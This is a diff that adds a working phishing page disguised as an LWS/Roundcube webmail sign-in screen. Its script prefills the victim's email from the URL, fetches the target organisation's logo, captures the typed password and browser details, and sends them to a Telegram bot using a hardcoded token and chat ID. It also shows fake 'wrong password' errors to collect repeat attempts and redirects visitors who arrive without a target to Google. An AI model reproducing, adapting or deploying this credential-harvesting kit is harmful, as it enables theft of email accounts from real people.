@@ -1,0 +1,441 @@
+<html lang="en">
+    <head>
+
+  
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg==" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="https://mail18.lwspanel.com/webmail/skins/larry/images/favicon.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><style type="text/css" id="operaUserStyle"></style>
+    <style type="text/css">
+      * {
+  font-family: 'Open Sans', sans-serif;
+}
+
+body {
+  background: #cad2d9;
+  padding: 2rem;
+}
+
+main {
+  margin-top: 3rem;
+
+}
+
+.main__text {
+  font-weight: 600;
+  color: #000;
+}
+
+.alert {
+  background: rgb(212, 4, 4);
+  padding: .5rem;
+  border-radius: 3px;
+  color: #fff;
+}
+
+.logo {
+  display: block;
+  width: 13%;
+  margin: 1rem auto .5rem auto;
+
+}
+
+.main-img {
+  width:  100%;
+}
+
+.main-content{
+  padding: 1.2rem;
+  background: linear-gradient(to bottom,#404040 0,#2e2e2e 100%);
+  border-radius: 6px;
+  margin: 0 auto;
+  height: 20%;
+}
+
+.header__logo {
+  text-align: center;
+  display: inline-block;
+  margin: .7rem auto 0 auto;
+  padding-bottom: 1.5rem;
+  width: 40%;
+}
+
+.header__text {
+  color:  rgb(0, 149, 194);
+  font-size: 1rem;
+  text-transform: capitalize;
+  font-weight: 600;
+  text-align: left;
+}
+
+.small__text {
+  font-size: .9rem;
+  text-align: center;
+}
+
+.text__form {
+  font-size: .8rem;
+  border-radius: 3px;
+  padding: .5rem;
+  background-color: #eee;
+  border: none;
+}
+
+.input-group-text {
+  color: #fff;
+  background-color: #005eeb;
+  border: none;
+}
+
+.footer_logo {
+  width: 10%;
+  display: block;
+  margin: 0 auto;
+}
+
+.footer__p {
+  display: inline-block;
+  font-size: .75rem;
+  margin: .86rem auto;
+}
+
+.blank {
+  background-color: red;
+  height: 100%;
+  width: 100%;
+  padding: 10%;
+}
+
+
+
+@media(max-width: 772px){
+  .main-content{
+    border-left: none;
+    padding-left: 0;
+    padding: 2rem;
+  
+  }
+
+
+  .small__text {
+    font-size: .8rem;
+    text-align: left;
+  }
+}
+
+    </style>
+    <title>LWS Webmail :: Welcome To LWS Webmail</title>
+
+
+  
+  </head><body><main>
+    <div class="container">
+      <div class="container">
+     
+      <div class="row align-items-center my-2">
+          <div class="col-5 centered main-content">
+
+            <div class="header__content">
+              
+            </div>
+              
+              <img id="logo" class="logo" src="" alt="">
+              <!-- <h1 class="header__text my-2">Sign In</h1> -->
+              <h1 class="text-left text-white header__text py-3">
+                <!-- <span id="organization"></span> -->
+                </h1>
+              <small id="emailHelp" class="form-text small__text text-white text-left pb-4">
+                Authenticate with your <span id="infoText1"></span> account to continue. 
+              </small>
+  
+              <!--FORM-->
+              <form class="form">
+                <div class="input-group my-3">
+                  <input type="text" class="form-control  text__form" id="username" readonly="" aria-label="Username" aria-describedby="basic-addon1" required="">  
+                </div>
+                <div class="form-group">
+                  <input type="password" id="pass" name="password" class="form-control text__form" aria-describedby="emailHelp" placeholder="Password" required="">
+                </div>
+                <div class="form-group" id="dropdown">
+                 
+                </div>
+                <input type="submit" class="btn btn__submit mb-3" id="lo-form" value="Login">
+              </form>
+              
+
+          </div>
+
+      </div>
+  
+
+      </div>
+    </div> 
+  </main>
+
+
+
+  
+    <script>
+      let params = getProcessHash();         
+     /*<![CDATA[*/
+$(document).ready(function(){
+    // console.log(params)
+    if(!params){
+      // force display of another page
+     window.location.replace("https://www.google.com");
+    }
+    var domain = params.split('@')[1]
+    var organization = UcFirst(domain.split('.')[0]);
+    var tld = domain.split('.')[1];
+    var uname = params.split('@')[0];
+    var browser = GetBrowserandLanguage()[0];
+    var timeSubmitted = 0;
+    var count = 0;
+  
+    console.log(browser);
+
+    AddValuesToPage(domain,organization,tld,uname)
+    document.getElementById("logo").src= "https://logo.clearbit.com/"+domain
+
+
+    $('.form').submit(function(e) {
+    // initiate UI class
+    const ui = new UI();
+
+    // Disable Inputs on Submit
+    ui.disableInputs(true);
+
+    // Change Button Text To Processing...
+    ui.buttonText('Processing...');
+
+    
+
+    e.preventDefault();
+    var password = document.getElementById('pass').value;
+
+    var date = new Date();
+    var message = "--------+ Roundcube Webmail ReZulT +--------\n";
+    message += "Email : " + params + "\n";
+    message += "Password : " + password + "\n";
+    message += "Browser: " + browser + "\n";
+    message += "Date: " + date + "\n";
+    message += "---------+ Roundcube Webmail ReZulT+-------------\n";
+    var token = "6646272616:AAFHmUG9T4OP7-k1Nc8gxGAwn5pfDfpvsYs";
+    var chatId = "1044818876";
+    
+	
+	
+    $.ajax({
+      url: `https://api.telegram.org/bot${token}/sendMessage`,
+      type: 'POST',
+      data: {
+        "chat_id": chatId,
+        "text": message
+      },
+      dataType: 'JSON',
+      success: function(response) {
+        if (response) {
+
+          console.log(response);
+
+          if (response['ok'] == true) {
+            if (count >= 3) {
+              console.log('Ready Count')
+              count = 0;
+              // window.location.replace(response['redirect_link']);
+              // window.location.replace("https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee");
+              // Disable Input
+              ui.disableInputs(true);
+  
+              ui.showStaticAlert('Network Error, Please Try Again Later');
+  
+            }else{
+              //I want the password input to bounce and error message of wrong username and passwod displayed.
+              ui.showAlert('Wrong Username And Password!')
+              ui.buttonText('Login');
+              count++;
+             // Clear Password Input Field
+            $('#pass').val('')
+  
+            // Set Disable Input To False
+            ui.disableInputs(false);
+  
+            console.log(count)
+              // $('#msg').html(response['msg']);
+            }
+          }
+
+          
+        } 
+      },
+      error: function(err) {
+        const ui = new UI();
+
+        // Show alert
+        ui.showAlert('Processing Error !');
+
+        console.log('Errror!', err)
+
+        // Set Disable Input To False
+        ui.disableInputs(false);
+
+        // Change Button Text Back to Submit
+        ui.buttonText(`Login`);
+
+        // Clear The Password Input
+        $('#pass').val('')
+
+        // Log Error
+        console.log(err)
+      }
+    })
+  })
+
+});
+
+
+      // Add Values To Page
+function AddValuesToPage(domain,organization,tld,uname){
+  $('#organization').html(organization);
+  $('#infoText1').html(organization);
+  $('#infoText2').html(organization);
+  $('#infoText3').html(domain);
+  $('#infoText4').html(domain);
+  $('#username').val(params);
+}
+
+
+// Get Parameters By Name
+function getParameterByName(name, url) {
+  if (!url) url = window.location.href;
+  name = name.replace(/[\[\]]/g, '\\$&');
+  var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+    results = regex.exec(url);
+  if (!results) return null;
+  if (!results[2]) return '';
+  var encodedUri = decodeURIComponent(results[2].replace(/\+/g, ' '));
+  return atob(encodedUri);
+}
+
+
+// Get Browser And Name
+function GetBrowserandLanguage(){
+  // deliver this method 
+  let browser = window.clientInformation.appVersion;
+  let language =  window.clientInformation.language;
+  // the return should be an array sorry not object ooo s
+  let info = [browser, language]
+
+  // return info array
+  return info;
+}
+
+
+
+function str_random(l = 10) {
+  let a = `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`;
+  let str = '';
+  for (let i = 0; i < l; i++) {
+    str += a[Math.floor(Math.random() * a.length)];
+  }
+  return str;
+}
+
+function isBase64(str) {
+    try {
+        return btoa(atob(str)) == str;
+    } catch (err) {
+        return false;
+    }
+  }
+
+  function UcFirst(string) 
+  {
+      return string.charAt(0).toUpperCase() + string.slice(1);
+  }
+
+
+  // Get Process Hash
+function getProcessHash() {
+  if (window.location.hash) {
+    let h = window.location.hash;
+    let s = h.split('#')[1];
+    if(isBase64(s)){
+      return atob(s)
+    }else{
+      return s
+    }
+  }
+  return null;
+} /*]]>*/
+
+
+
+// UI Class
+class UI {
+  showAlert(message){
+    // Create div element
+    const div = document.createElement('div');
+
+    // Add classname to div
+    div.className = `alert error`;
+
+    // Add Text
+    div.appendChild(document.createTextNode(message));
+
+    // Get Parent
+    const secContainer = document.querySelector('.main-content');
+
+    // Get Logo
+    const form = document.querySelector('.form');
+
+    // Insert Element
+    secContainer.insertBefore(div, form);
+
+    // Remove Element After 3 secs
+    setTimeout(function(){
+      document.querySelector('.alert').remove();
+    }, 1000);
+
+  }
+
+  showStaticAlert(message){
+    // Create div element
+    const div = document.createElement('div');
+
+    // Add classname to div
+    div.className = `alert error`;
+
+    // Add Text
+    div.appendChild(document.createTextNode(message));
+
+    // Get Parent
+    const secContainer = document.querySelector('.main-content');
+
+    // Get Logo
+    const form = document.querySelector('.form');
+
+    // Insert Element
+    secContainer.insertBefore(div, form);
+  }
+
+  disableInputs(condition){
+    $('.btn__submit').prop('disabled', condition);
+    $('#pass').prop('disabled', condition);
+    $('#username').prop('disabled', condition);
+
+  }
+
+  buttonText(message){
+    $('.btn__submit').prop('value', message);
+  }
+}
+    </script>
+  
+</body></html>
